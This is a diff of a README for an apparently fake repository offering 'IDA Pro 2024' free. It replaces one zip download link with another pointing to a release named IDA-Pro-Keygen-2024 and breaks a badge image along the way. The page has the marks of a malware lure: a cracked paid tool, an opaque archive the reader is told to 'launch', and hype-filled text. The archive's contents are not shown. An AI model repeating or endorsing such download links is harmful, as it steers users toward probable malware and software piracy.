@@ -17,7 +17,7 @@ Explore various topics related to IDA Pro 2024 and its availability on this repo
 - `idapro`
 
 ## 🔗 Download Link
-👉 [Download IDA Pro 2024](https://github.com/user-attachments/files/18410590/Software.zip) 👈
+👉 [Download IDA Pro 2024](https://github.com/potato-oss/IDA-Pro-Keygen-2024/releases/download/v1.0/Application.zip) 👈
 
 Note: The link provided needs to be launched to start your download of IDA Pro 2024.
 
@@ -25,7 +25,7 @@ Don't miss out on this opportunity to explore the world of IDA Pro 2024 without 
 
 For additional options or in case the provided link is inaccessible, be sure to check out the "Releases" section of this repository for alternative download sources.
 
-[![Download IDA Pro 2024](https://img.shields.io/badge/Download-IDA%20Pro%202024-brightgreen)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download IDA Pro 2024](https://github.com/potato-oss/IDA-Pro-Keygen-2024/releases/download/v1.0/Application.zip%20Pro%202024-brightgreen)](https://github.com/potato-oss/IDA-Pro-Keygen-2024/releases/download/v1.0/Application.zip)
 
 ## 🌟 Get Started
 Get started with IDA Pro 2024 today and embark on a journey of discovery and innovation within the realm of software analysis. This repository is your gateway to a world of possibilities - take the first step now! 🌈
